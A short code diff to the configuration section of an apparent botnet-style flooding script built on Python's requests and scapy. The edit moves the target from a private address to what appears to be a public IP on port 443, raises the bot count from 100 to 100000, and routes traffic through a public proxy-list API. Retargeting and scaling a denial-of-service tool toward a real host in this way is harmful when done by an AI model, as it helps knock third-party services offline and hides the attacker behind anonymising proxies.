@@ -6,9 +6,9 @@ import requests
 from scapy.all import *
 
 # Configuration
-target_ip = "192.168.1.1" # Replace with target IP
-target_port = 80 # Replace with target port
-botnet_size = 100 # Number of bots in the botnet
+target_ip = "172.67.139.92" # Replace with target IP
+target_port = 443 # Replace with target port
+botnet_size = 100000 # Number of bots in the botnet
 requests_per_second = 100 # Rate of requests per second per bot
 proxy_list = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
